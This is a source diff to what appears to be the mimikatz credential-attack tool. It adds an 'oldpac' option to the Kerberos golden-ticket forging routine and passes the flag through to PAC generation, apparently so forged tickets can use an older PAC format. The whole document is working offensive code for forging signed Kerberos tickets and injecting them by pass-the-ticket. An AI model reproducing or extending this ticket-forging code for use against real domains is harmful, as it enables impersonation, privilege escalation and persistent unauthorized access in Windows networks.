@@ -421,6 +421,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 	NTSTATUS status;
 	PKERB_ECRYPT pCSystem;
 	BOOL isPtt = kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL);
+	BOOL oldPac = kull_m_string_args_byName(argc, argv, L"oldpac", NULL, NULL);
 
 	kull_m_string_args_byName(argc, argv, L"ticket", &filename, L"ticket." MIMIKATZ_KERBEROS_EXT);
 	if(kull_m_string_args_byName(argc, argv, L"admin", &szUser, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
@@ -505,7 +506,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 							kull_m_string_displayLocalFileTime(&lifeTimeData.TicketEnd); kprintf(L" ; ");
 							kull_m_string_displayLocalFileTime(&lifeTimeData.TicketRenew); kprintf(L"\n");
 							kprintf(L"-> Ticket : %s\n\n", isPtt ? L"** Pass The Ticket **" : filename);
-							if(BerApp_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, szService, szTarget, &lifeTimeData, key, pCSystem->KeySize, keyType, pSid, netbiosDomain, id, groups, nbGroups, sids, nbSids, rodc, pClaimsSet))
+							if(BerApp_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, szService, szTarget, &lifeTimeData, key, pCSystem->KeySize, keyType, pSid, netbiosDomain, id, groups, nbGroups, sids, nbSids, rodc, pClaimsSet, oldPac))
 							{
 								if(isPtt)
 								{
@@ -580,7 +581,7 @@ NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD
 	return status;
 }
 
-PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, LPCBYTE key, DWORD keySize, DWORD keyType, PISID sid, LPCWSTR LogonDomainName, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, DWORD rodc, PCLAIMS_SET pClaimsSet)
+PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, LPCBYTE key, DWORD keySize, DWORD keyType, PISID sid, LPCWSTR LogonDomainName, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, DWORD rodc, PCLAIMS_SET pClaimsSet, BOOL oldPac)
 {
 	NTSTATUS status = STATUS_INVALID_PARAMETER;
 	KIWI_KERBEROS_TICKET ticket = {0};
@@ -634,7 +635,7 @@ PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWST
 	{
 		if(pValidationInfo = kuhl_m_pac_infoToValidationInfo(&lifetime->TicketStart, username, domainname, LogonDomainName, sid, userid, groups, cbGroups, sids, cbSids))
 		{
-			if(kuhl_m_pac_validationInfo_to_PAC(pValidationInfo, NULL, NULL, SignatureType, pClaimsSet, &pacType, &pacTypeSize))
+			if(kuhl_m_pac_validationInfo_to_PAC(pValidationInfo, NULL, NULL, SignatureType, pClaimsSet, sid, userid, domainname, oldPac, &pacType, &pacTypeSize))
 			{
 				kprintf(L" * PAC generated\n");
 				status = kuhl_m_pac_signature(pacType, pacTypeSize, SignatureType, key, keySize);
